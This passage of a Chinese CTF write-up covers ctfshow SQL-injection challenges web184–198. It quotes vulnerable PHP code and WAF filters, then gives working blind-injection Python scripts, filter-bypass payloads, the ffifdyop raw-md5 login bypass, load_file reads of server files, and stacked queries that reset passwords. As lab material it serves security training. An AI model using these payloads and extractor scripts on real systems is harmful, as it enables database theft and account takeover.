**`ON b.pass LIKE 'ctfshow%'`：连接条件是 b 表的 pass 字段以 `ctfshow` 开头。**

**`count(pass)`：统计符合条件的记录数。**

&nbsp;



**回显 `$user_count=43` 则判断正确**

```sql
tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725
```

<img src="\images\article_images\image-20250824232254620.png" alt="image-20250824232254620" style="zoom:25%;" />

&nbsp;





<img src="\images\article_images\image-20250824232425039.png" alt="image-20250824232425039" style="zoom:25%;" />

```python
import requests
import time
import binascii

# ==================== 配置区 ====================
URL = "http://fb220894-1420-42b2-9cb9-a595c452d077.challenge.ctf.show/select-waf.php"

POST_NAME = "tableName"
POST_VALUE_PREFIX = "ctfshow_user as a right join ctfshow_user as b on b.pass like "
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
PREFIX = "ctfshow{"
MAX_LEN = 45
SLEEP_TIME = 0.05
SUCCESS_KEY = "$user_count = 43"

# ==================== 工具函数 ====================
def to_hex(s: str) -> str:
    """把字符串转换成 MySQL HEX 形式"""
    str_16 = binascii.b2a_hex(s.encode('utf-8'))
    return str_16.decode()

# ==================== 脚本逻辑 ====================
def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            # 每次把 flag + 当前字符 + % 转 HEX
            hex_payload = "0x" + to_hex(flag + ch + "%")
            payload = f"{POST_VALUE_PREFIX}{hex_payload}"
            data = {POST_NAME: payload}

            try:
                res = requests.post(url=URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f"[!] 请求出错: {e}")
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f"[+] 已发现: {flag}")
                found = True
                if ch == "}":  
                    print(f"[✓] 最终 flag: {flag}")
                    return flag
                break

        if not found:
            print("[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全")
            break

        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    brute_force()

```

&nbsp;



---

# web185

```sql
查询语句
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ".$_POST['tableName'].";";
   
   
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }

   
查询结果
//返回用户表的记录总数
      $user_count = 0;
```

&nbsp;



**`mysql` 中的命令**

```mysql
mysql> SELECT CONCAT('my', 's', 'ql'); 
-> 'mysql'
mysql> SELECT true + true;
->  2
```

&nbsp;



<img src="\images\article_images\image-20250825000127428.png" alt="image-20250825000127428" style="zoom:25%;" />

```python
# -- coding:UTF-8 --
# Author:dota_st + modified
import requests
import time

# ==================== 配置区 ====================
URL = "http://603b48c4-c187-4214-9301-5f6164de0af8.challenge.ctf.show/select-waf.php"

POST_NAME = "tableName"

# 可选字符集
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-"

# 已知 flag 前缀
PREFIX = "ctfshow{"

MAX_LEN = 45
SLEEP_TIME = 0.05

# 服务器响应里判断条件是否成立的关键字
SUCCESS_KEY = "$user_count = 43"

# ==================== 函数区 ====================
def createNum(n):
    s = 'true'
    if n == 1:
        return 'true'
    for i in range(n - 1):
        s += "+true"
    return s

def change_str(s):
    """
    将字符串转换为 chr(x) 拼接形式，用于 SQL concat()
    例如 'abc' -> chr(97),chr(98),chr(99)
    """
    res = "chr(" + createNum(ord(s[0])) + ")"
    for c in s[1:]:
        res += ",chr(" + createNum(ord(c)) + ")"
    return res

# ==================== 脚本逻辑 ====================
def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f"ctfshow_user as a right join ctfshow_user as b on b.pass like(concat({change_str(flag + ch + '%')}))"
            data = {POST_NAME: payload}

            try:
                res = requests.post(URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f"[!] 请求出错: {e}")
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f"[+] 已发现: {flag}")
                found = True
                if ch == "}":
                    print(f"[✓] 最终 flag: {flag}")
                    return flag
                break

        if not found:
            print("[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全")
            break

        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    brute_force()

```

&nbsp;



---

# web186

```sql
查询语句
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ".$_POST['tableName'].";";
   
   
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }

   
查询结果
//返回用户表的记录总数
      $user_count = 0;
```

&nbsp;



**利用web185的脚本解题**

<img src="\images\article_images\image-20250825165020916.png" alt="image-20250825165020916" style="zoom:25%;" />

```python
# -- coding:UTF-8 --
# Author:dota_st + modified
import requests
import time

# ==================== 配置区 ====================
URL = "http://76018f77-8b0e-414f-a7a1-c988148411ed.challenge.ctf.show/select-waf.php"

POST_NAME = "tableName"

# 可选字符集
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-"

# 已知 flag 前缀
PREFIX = "ctfshow{"

MAX_LEN = 45
SLEEP_TIME = 0.05

# 服务器响应里判断条件是否成立的关键字
SUCCESS_KEY = "$user_count = 43"

# ==================== 函数区 ====================
def createNum(n):
    s = 'true'
    if n == 1:
        return 'true'
    for i in range(n - 1):
        s += "+true"
    return s

def change_str(s):
    """
    将字符串转换为 chr(x) 拼接形式，用于 SQL concat()
    例如 'abc' -> chr(97),chr(98),chr(99)
    """
    res = "chr(" + createNum(ord(s[0])) + ")"
    for c in s[1:]:
        res += ",chr(" + createNum(ord(c)) + ")"
    return res

# ==================== 脚本逻辑 ====================
def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f"ctfshow_user as a right join ctfshow_user as b on b.pass like(concat({change_str(flag + ch + '%')}))"
            data = {POST_NAME: payload}

            try:
                res = requests.post(URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f"[!] 请求出错: {e}")
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f"[+] 已发现: {flag}")
                found = True
                if ch == "}":
                    print(f"[✓] 最终 flag: {flag}")
                    return flag
                break

        if not found:
            print("[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全")
            break

        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    brute_force()

```

&nbsp;



---

# web187

```sql
查询语句
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";
      
      
返回逻辑
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

&nbsp;



**`md5` 函数基本语法**

```php
string md5 ( string $str , bool $raw_output = false )
```

- **第一个参数 `$str`**
  需要加密的字符串。
- **第二个参数 `$raw_output`**
  是否以 **原始的二进制格式** 返回。
  - 默认是 `false`，返回 **32 位十六进制字符串**（常见的 MD5）。
  - 如果传 `true`，返回 **16 字节的原始二进制数据**（不可读）。

&nbsp;



**`ffifdyop` 字符串经 `md5(password,true)` 处理之后会变成 `276f722736c95d99e921722cf9ed621c`**
**而 Mysql 会把 `hex` 转成 `ascii` 解释，这个字符串前几位刚好是 `' or '6<乱码>`，`or` 后的内容是永真式**

&nbsp;



```powershell
用户名：admin
密码：ffifdyop
```

<img src="\images\article_images\image-20250825175128037.png" alt="image-20250825175128037" style="zoom: 25%;" />

&nbsp;



---

# web188

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
   
   
返回逻辑
  //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```

**填入的 `username` 和 `password` 为字符串**

**以字母开头的字符串在和数字比较时，会被强制转换为0**

&nbsp;



```powershell
用户名：0
密码：0
```

<img src="\images\article_images\image-20250825180341102.png" alt="image-20250825180341102" style="zoom:25%;" />

&nbsp;



---

# web189

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
  
  
返回逻辑
  //用户名检测
  if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
```

&nbsp;



**`load_file(file_path)` 函数**

```sql
LOAD_FILE(file_path)
```

- **作用：读取服务器上的文件内容，返回为一个字符串。**

- **参数：`file_path`：文件的绝对路径**
      **例如 `/etc/passwd` 或 `C:\Windows\system32\drivers\etc\hosts`**

- **返回值：**
  - **成功 → 文件内容作为字符串**
  - **失败 → NULL**

&nbsp;



**`regexp` 函数**

```sql
column_name REGEXP pattern
```

- 作用：判断某列的值是否 **匹配正则表达式 `pattern`**。
- 返回值：
  - 匹配 → `1`
  - 不匹配 → `0`

**常用语法规则**

| 表达式  | 含义                       |
| ------- | -------------------------- |
| `^abc`  | 以 `abc` 开头              |
| `xyz$`  | 以 `xyz` 结尾              |
| `[a-z]` | 匹配任意小写字母           |
| `[0-9]` | 匹配任意数字               |
| `.`     | 匹配任意单个字符           |
| `*`     | 匹配前一个字符 0 次或多次  |
| `+`     | 匹配前一个字符 1 次或多次  |
| `?`     | 匹配前一个字符 0 次或 1 次 |

&nbsp;



```php
// username/pass 输入 0/0	 输出 密码错误
// username/pass 输入 1/0	 输出 查询失败

// 输出 密码错误 表示条件为真
// 输出 查询失败 表示条件为假

// username 存在支持布尔盲注的条件
```

&nbsp;



<img src="\images\article_images\image-20250825183438096.png" alt="image-20250825183438096" style="zoom:25%;" />

&nbsp;



**查询为真时的关键字 `\u5bc6\u7801\u9519\u8bef`**

&nbsp;



**测试一下**

**查询为假时返回“查询失败”**

```sql
if(load_file('/var/www/html/api/index.php')regexp'ctfshow1',0,1)
```

<img src="\images\article_images\image-20250825221753164.png" alt="image-20250825221753164" style="zoom: 25%;" />

&nbsp;



**查询为真时返回“密码错误”**

```sql
if(load_file('/var/www/html/api/index.php')regexp'ctfshow{',0,1)
```

<img src="\images\article_images\image-20250825221905412.png" alt="image-20250825221905412" style="zoom: 25%;" />

&nbsp;





**利用脚本解题**

<img src="\images\article_images\image-20250825221604394.png" alt="image-20250825221604394" style="zoom:33%;" />

```python
import requests
import time

# ==================== 配置区 ====================

URL = "http://6d5fdcd5-caca-4e9e-98d0-7af939d64d46.challenge.ctf.show/api/index.php"

# POST 请求参数配置
USERNAME_PARAM = "username"
PASSWORD_PARAM = "password"

POST_VALUE_PREFIX = "if(load_file('/var/www/html/api/index.php')regexp'"
POST_VALUE_SUFFIX = "',0,1)"   # 注意这里补上 ,0,1 和右括号

# 可选字符集
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

# 已知 flag 前缀
PREFIX = "ctfshow{"

# 最大尝试长度
MAX_LEN = 45

# 请求延迟
SLEEP_TIME = 0.05

# 服务器响应关键字
SUCCESS_KEY = r"\u5bc6\u7801\u9519\u8bef"

# ==================== 脚本逻辑 ====================

def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f"{POST_VALUE_PREFIX}{flag + ch}{POST_VALUE_SUFFIX}"
            data = {
                USERNAME_PARAM: payload,
                PASSWORD_PARAM: 0
            }
            
            try:
                res = requests.post(url=URL, data=data, timeout=5)
                time.sleep(SLEEP_TIME)
            except requests.exceptions.RequestException as e:
                print(f"[!] 请求出错: {e}")
                continue
            
            if SUCCESS_KEY in res.text:
                flag += ch
                print(f"[+] 已发现: {flag}")
                found = True
                if ch == "}":
                    print(f"[✓] 最终 flag: {flag}")
                    return flag
                break
        
        if not found:
            print("[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全")
            break

if __name__ == "__main__":
    brute_force()

```



---

# web190

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
      
      
返回逻辑
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
```

&nbsp;



**可以利用回显“密码错误”和“用户名不存在”判断测试的正确与否**

**查询为真时返回“密码错误”**

**关键字 `\u5bc6\u7801\u9519\u8bef`**

<img src="\images\article_images\image-20250825223554096.png" alt="image-20250825223554096" style="zoom:25%;" />

&nbsp;



**查询为假时返回“用户名不存在”**

<img src="\images\article_images\image-20250825223626787.png" alt="image-20250825223626787" style="zoom:25%;" />



&nbsp;



**爆破库名**

<img src="\images\article_images\image-20250825230830996.png" alt="image-20250825230830996" style="zoom:50%;" />

&nbsp;



**爆破表名**

<img src="\images\article_images\image-20250825230448836.png" alt="image-20250825230448836" style="zoom:50%;" />

&nbsp;



**爆破字段**

<img src="\images\article_images\image-20250825230510423.png" alt="image-20250825230510423" style="zoom: 50%;" />

&nbsp;



**爆破flag**

<img src="\images\article_images\image-20250825230156934.png" alt="image-20250825230156934" style="zoom:50%;" />

&nbsp;



```python
import requests
import time

# ==================== 配置区 ====================
URL = "http://bcf69769-3d02-4adf-81f2-b1d47707987e.challenge.ctf.show/api/"

# POST 请求参数
USERNAME_PARAM = "username"
PASSWORD_PARAM = "password"
DEFAULT_PASSWORD = "123456"

# 爆破范围（ASCII）
ASCII_START = 32          # 空格开始
ASCII_END = 127           # ~ 结束
MAX_LEN = 45              # 最长 flag 长度

# SQL payload（注意：用 {} 占位符）
# PAYLOAD = "select database()"
# PAYLOAD = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# PAYLOAD = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
PAYLOAD = "select f1ag from ctfshow_fl0g"

# 服务端响应中判断条件是否成立的关键字
SUCCESS_KEY = "密码错误"  # 填转义后的即可，下面有json处理

# 请求延迟（避免 WAF）
SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = ""
    for i in range(1, MAX_LEN + 1):
        start, end = ASCII_START, ASCII_END
        while start < end:
            mid = (start + end) >> 1
            # 构造 payload
            condition = f"ascii(substr(({PAYLOAD}), {i}, 1)) > {mid}" # 二分法
            inj = f"admin' and if({condition}, 1, 2)=1#"

            data = {
                USERNAME_PARAM: inj,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            }

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get("msg", "")
            except Exception as e:
                print(f"[!] 请求失败: {e}")
                return flag

            if SUCCESS_KEY in msg:
                start = mid + 1
            else:
                end = mid

            time.sleep(SLEEP_TIME)

        # 一个字符确定
        flag += chr(start)
        print(f"[+] 当前进度: {flag}")

        # 提前结束
        if flag.endswith("}"):
            print(f"[✓] 最终结果: {flag}")
            return flag

    print(f"[!] 达到最大长度，最终结果: {flag}")
    return flag


if __name__ == "__main__":
    extract_flag()

```

&nbsp;



---

# web191

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
    
    
返回逻辑
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

&nbsp;



**`ord()`：ord函数返回字符串的第一个字符的ascii值**

**因此， `ascii() ` 函数和 `ord()` 函数对于单字节处理两者作用一样**

&nbsp;



<img src="\images\article_images\image-20250825232912490.png" alt="image-20250825232912490" style="zoom:33%;" />

```python
import requests
import time

# ==================== 配置区 ====================
URL = "http://4953d4e6-b84c-42d4-aeb3-8be66b9feae2.challenge.ctf.show/api/"

# POST 请求参数
USERNAME_PARAM = "username"
PASSWORD_PARAM = "password"
DEFAULT_PASSWORD = "0"

# 爆破范围（ASCII）
ASCII_START = 32          # 空格开始
ASCII_END = 127           # ~ 结束
MAX_LEN = 45              # 最长 flag 长度

# SQL payload（注意：用 {} 占位符）
# PAYLOAD = "select database()"
# PAYLOAD = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# PAYLOAD = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
PAYLOAD = "select f1ag from ctfshow_fl0g"

# 服务端响应中判断条件是否成立的关键字
SUCCESS_KEY = "密码错误"  # 填转义后的即可，下面有json处理

# 请求延迟（避免 WAF）
SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = ""
    for i in range(1, MAX_LEN + 1):
        start, end = ASCII_START, ASCII_END
        while start < end:
            mid = (start + end) >> 1
            # 构造 payload
            condition = f"ord(substr(({PAYLOAD}), {i}, 1)) > {mid}" # 二分法
            inj = f"admin' and if({condition}, 1, 2)=1#"

            data = {
                USERNAME_PARAM: inj,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            }

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get("msg", "")
            except Exception as e:
                print(f"[!] 请求失败: {e}")
                return flag

            if SUCCESS_KEY in msg:
                start = mid + 1
            else:
                end = mid

            time.sleep(SLEEP_TIME)

        # 一个字符确定
        flag += chr(start)
        print(f"[+] 当前进度: {flag}")

        # 提前结束
        if flag.endswith("}"):
            print(f"[✓] 最终结果: {flag}")
            return flag

    print(f"[!] 达到最大长度，最终结果: {flag}")
    return flag


if __name__ == "__main__":
    extract_flag()

```

&nbsp;



---

# web192

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
     
     
返回逻辑
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

&nbsp;



**过滤了 `ascii` 和 `ord` ，使用正则函数逐个匹配字符**

&nbsp;



<img src="\images\article_images\image-20250825234254961.png" alt="image-20250825234254961" style="zoom:50%;" />

```python
import requests
import time

# ==================== 配置区 ====================
URL = "http://438b14df-480f-426e-9341-eec2a403489e.challenge.ctf.show/api/"

USERNAME_PARAM = "username"
PASSWORD_PARAM = "password"
DEFAULT_PASSWORD = "1"

# 爆破字符集
ALL_STR = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
MAX_LEN = 45

# SQL payload
# PAYLOAD = "select database()"
# PAYLOAD = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# PAYLOAD = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
PAYLOAD = "select f1ag from ctfshow_fl0g"

# 服务端响应判断关键字
SUCCESS_KEY = "密码错误"    # 填转义后的即可，下面有json处理

SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for ch in ALL_STR:
            # 构造 payload
            username_data = f"admin' and if(substr(({PAYLOAD}), {i}, 1) regexp '{ch}', 1, 0)=1#"
            data = {
                USERNAME_PARAM: username_data,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            }

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get("msg", "")
            except Exception as e:
                print(f"[!] 请求失败: {e}")
                return flag

            if SUCCESS_KEY in msg:
                flag += ch
                print(f"[+] 当前进度: {flag}")
                found = True
                break

            time.sleep(SLEEP_TIME)

        if not found:
            # 没匹配到，可能是 flag 结束
            if flag.endswith("}"):
                print(f"[✓] 最终结果: {flag}")
                return flag
            else:
                print(f"[!] 第{i}个字符未匹配到，停止爆破")
                return flag

        if flag.endswith("}"):
            print(f"[✓] 最终结果: {flag}")
            return flag

    print(f"[!] 达到最大长度，最终结果: {flag}")
    return flag


if __name__ == "__main__":
    extract_flag()

```

&nbsp;



---

# web193

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
    
    
返回逻辑
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex|substr/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

**过滤了 `substr` ，可以使用正则来代替，`^`从第一位开始匹配**

&nbsp;



**爆破库名**

<img src="\images\article_images\image-20250826001349157.png" alt="image-20250826001349157" style="zoom:50%;" />

&nbsp;



**爆破表名**

<img src="\images\article_images\image-20250826001623740.png" alt="image-20250826001623740" style="zoom:50%;" />

&nbsp;



**爆破字段**

<img src="\images\article_images\image-20250826001735520.png" alt="image-20250826001735520" style="zoom:50%;" />

&nbsp;



**爆破flag**

<img src="\images\article_images\image-20250826001943487.png" alt="image-20250826001943487" style="zoom:50%;" />

&nbsp;



```python
import requests
import time

# ==================== 配置区 ====================
URL = "http://af5d4c10-6649-4744-9a04-bb4cc4ca4810.challenge.ctf.show/api/"

USERNAME_PARAM = "username"
PASSWORD_PARAM = "password"
DEFAULT_PASSWORD = "1"

# 爆破字符集
ALL_STR = "0123456789abcdefghijklmnopqrstuvwxyz-,_{}"
MAX_LEN = 45

# SQL payload
# PAYLOAD = "select database()"
# PAYLOAD = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# PAYLOAD = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"
PAYLOAD = "select f1ag from ctfshow_flxg"

# 服务端响应判断关键字
SUCCESS_KEY = "密码错误"    # 填转义后的即可，下面有json处理

SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for ch in ALL_STR:
            # 构造 payload
            username_data = f"admin' and if(({PAYLOAD}) regexp ('^{flag}{ch}'), 1, 0)=1#"
            data = {
                USERNAME_PARAM: username_data,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            }

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get("msg", "")
            except Exception as e:
                print(f"[!] 请求失败: {e}")
                return flag

            if SUCCESS_KEY in msg:
                flag += ch
                print(f"[+] 当前进度: {flag}")
                found = True
                break

            time.sleep(SLEEP_TIME)

        if not found:
            # 没匹配到，可能是 flag 结束
            if flag.endswith("}"):
                print(f"[✓] 最终结果: {flag}")
                return flag
            else:
                print(f"[!] 第{i}个字符未匹配到，停止爆破")
                return flag

        if flag.endswith("}"):
            print(f"[✓] 最终结果: {flag}")
            return flag

    print(f"[!] 达到最大长度，最终结果: {flag}")
    return flag


if __name__ == "__main__":
    extract_flag()

```



&nbsp;



---

# web194

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
      
      
返回逻辑
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

&nbsp;



**可以使用web193的脚本解题**

<img src="\images\article_images\image-20250826002646514.png" alt="image-20250826002646514" style="zoom:50%;" />

&nbsp;



```python
import requests
import time

# ==================== 配置区 ====================
URL = "http://639ef789-73f4-463e-bdbe-712d368c8cd2.challenge.ctf.show/api/"

USERNAME_PARAM = "username"
PASSWORD_PARAM = "password"
DEFAULT_PASSWORD = "1"

# 爆破字符集
ALL_STR = "0123456789abcdefghijklmnopqrstuvwxyz-,_{}"
MAX_LEN = 45

# SQL payload
# PAYLOAD = "select database()"
# PAYLOAD = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# PAYLOAD = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"
PAYLOAD = "select f1ag from ctfshow_flxg"

# 服务端响应判断关键字
SUCCESS_KEY = "密码错误"    # 填转义后的即可，下面有json处理

SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for ch in ALL_STR:
            # 构造 payload
            username_data = f"admin' and if(({PAYLOAD}) regexp ('^{flag}{ch}'), 1, 0)=1#"
            data = {
                USERNAME_PARAM: username_data,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            }

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get("msg", "")
            except Exception as e:
                print(f"[!] 请求失败: {e}")
                return flag

            if SUCCESS_KEY in msg:
                flag += ch
                print(f"[+] 当前进度: {flag}")
                found = True
                break

            time.sleep(SLEEP_TIME)

        if not found:
            # 没匹配到，可能是 flag 结束
            if flag.endswith("}"):
                print(f"[✓] 最终结果: {flag}")
                return flag
            else:
                print(f"[!] 第{i}个字符未匹配到，停止爆破")
                return flag

        if flag.endswith("}"):
            print(f"[✓] 最终结果: {flag}")
            return flag

    print(f"[!] 达到最大长度，最终结果: {flag}")
    return flag


if __name__ == "__main__":
    extract_flag()

```

&nbsp;



---

# web195

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
      
      
返回逻辑
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

&nbsp;



**==题解一==**

- **update  \`ctfshow_user\`**
  → 表示要更新一张叫 **`ctfshow_user`** 的表。

- **set  \`pass\` = 520**
  → 把这张表里所有行的 `pass` 字段的值都改成 `520`。

&nbsp;



**提交两次即可**

**第一次触发修改**

**第二次登录**

```sql
用户名：0;update`ctfshow_user`set`pass`=520
密码：520
```

<img src="\images\article_images\image-20250826154322059.png" alt="image-20250826154322059" style="zoom: 25%;" />

&nbsp;



**==题解二==**

**`admin` 的十六进制 `0x61646d696e`**

**更改密码**

```sql
0x61646d696e;update`ctfshow_user`set`pass`=1314
```

**登录**

```sql
用户名：0x61646d696e
密码：1314
```

<img src="\images\article_images\image-20250826160822814.png" alt="image-20250826160822814" style="zoom: 25%;" />



&nbsp;



---

# web196

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
      
      
返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

**`select` 没有被过滤**

&nbsp;



```sql
用户名：1;select(1)
密码：1
```

<img src="\images\article_images\image-20250826162950860.png" alt="image-20250826162950860" style="zoom: 25%;" />

&nbsp;



---

# web197

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
      
      
返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

&nbsp;



**在 `username` 把表全部查询出来，在 `password` 里传入表名**

**如果二者相等即可符合判断条件回显出flag**

```sql
用户名：0;show tables
密码：ctfshow_user
```

<img src="\images\article_images\image-20250826163319207.png" alt="image-20250826163319207" style="zoom:25%;" />

&nbsp;



---

# web198

```sql
查询语句
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
   
   
返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

&nbsp;



**==题解一==**

```sql
用户名：0;show tables
密码：ctfshow_user
```

<img src="\images\article_images\image-20250826164155005.png" alt="image-20250826164155005" style="zoom:33%;" />

